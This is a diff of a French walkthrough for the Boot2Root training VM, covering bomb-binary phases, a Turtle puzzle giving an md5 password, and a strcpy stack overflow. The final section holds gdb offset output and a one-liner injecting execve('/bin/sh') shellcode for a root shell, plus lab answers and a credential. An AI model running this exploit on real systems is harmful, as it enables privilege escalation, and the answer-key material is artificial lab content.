@@ -160,36 +160,13 @@ case 1:
 ```
 
 ### Phase 4
-- L'entree est un nombre. On a donc seulement bruteforce ce nombre.
+- L'entrée est un nombre. Il est passer en paramatre de la fonction `func4` celle ci dois retourner a `55 (0x37)`.
+- Nous avons recoder `func4`
 - LE SCRIPTTTT !
 
 ### Phase 5
-- On set un breakpoint au call de la fonction strings_not_equal et de regarder la correscpondance de chaque lettre avec l'autre
-<pre>
-gdb-peda$ disass phase_5
-Dump of assembler code for function phase_5:
-   0x08048d7a <+78>:    push   eax
-   0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
-   0x08048d80 <+84>:    add    esp,0x10
-gdb-peda$ b *0x08048d7b
-Breakpoint 1 at 0x8048d7b
-gdb-peda$ r bite
-Starting program: /home/alarm/Boot2Root/scripts/bomb bite
-Welcome this is my little bomb !!!! You have 6 stages with
-only one life good luck !! Have a nice day!
-Phase 1 defused. How about the next one?
-That's number 2.  Keep going!
-Halfway there!
-So you got that one.  Try this one.
-[----------------------------------registers-----------------------------------]
-EAX: 0xffffd590 ("srveaw")
-EBX: 0x804b7c0 ("abcdef")
-ECX: 0xffffd590 ("srveaw")
-[-------------------------------------code-------------------------------------]
-Legend: code, data, rodata, value
-
-Breakpoint 1, 0x08048d7b in phase_5 ()
-</pre>
+La string est encoder en fonction de sa representation ascii, a l'aide du dictionnaire "isrveawhobpnutfg". On recode cette fonction en on la bruteforce grace a notre script.
+- Script `gcc phase5/phase5_solver.c && ./a.out`
 - Ce qui donne:
 
 | g | i | a | n | t | s |
@@ -201,7 +178,7 @@ Breakpoint 1, 0x08048d7b in phase_5 ()
   - Les chiffres ne soit pas en double
   - Les chiffre doivent etre entre 0 et 6
   - que le premier est egale a 4
-- avec ces informations on a testé crée un script qui teste les 775 possibilités
+- avec ces informations on a crée un script qui teste les 775 possibilités
 - Ce qui donne:
 ```
 4 2 6 3 1 5
@@ -230,7 +207,7 @@ Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ## Turtle
 - Il y a un fichier avec des instructions
 - En l'interpretant avec un script javascript, on voit que les instructions ecrivent: SLASH
-- En le convertissant en md5 nous opettenons le mot de passe de zaz
+- En le convertissant en md5 nous obtenons le mot de passe de zaz
 - Ce qui donne:
 ```
 646da671ca01bb5d84dbb5fb2238dc8e
@@ -238,13 +215,13 @@ Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
 ## Zaz & Root
 - On voit qu'il y a un strcpy de argv[1], le programme peut donc être overflow
-```
+<pre>
 $> ltrace ./exploit_me testt
 __libc_start_main(0x80483f4, 2, 0xbffff704, 0x8048440, 0x80484b0 <unfinished ...>
 strcpy(0xbffff5e0, "testt")                                            = 0xbffff5e0
 puts("testt"testt)                                                     = 6
 +++ exited (status 0) +++
-```
+</pre>
 - On calcule l'offset
 <pre>
 zaz@BornToSecHackMe:~$ gdb ./exploit_me 
@@ -252,21 +229,38 @@ zaz@BornToSecHackMe:~$ gdb ./exploit_me
 gdb-peda$ pattern arg 200
 Set 1 arguments to program
 gdb-peda$ r
+Program received signal SIGSEGV, Segmentation fault.
 [----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb7fd0ff4 --> 0x1a4d7c
+ECX: 0xffffffff
+EDX: 0xb7fd28b8 --> 0x0
+ESI: 0x0
+EDI: 0x0
 EBP: 0x41514141 ('AAQA')
-ESP: 0xbffff5a0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+ESP: 0xbffff640 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
 EIP: 0x41416d41 ('AmAA')
 EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
 Invalid $PC address: 0x41416d41
+[------------------------------------stack-------------------------------------]
+0000| <strong>0xbffff640</strong> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0004| 0xbffff644 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0008| 0xbffff648 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0012| 0xbffff64c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0016| 0xbffff650 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0020| 0xbffff654 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0024| 0xbffff658 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0028| 0xbffff65c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
 0x41416d41 in ?? ()
-gdb-peda$ pattern offset AmAA
-AmAA found at offset: 140
+gdb-peda$  pattern offset AmAA
+AmAA found at offset: <strong>140</strong>
 </pre>
+
 - Ce qui donne
 ```
-./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 121) + struct.pack('<I', 0xbffff560))")
+cat | ./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 121) + struct.pack('<I', 0xbffff640))")
 ```
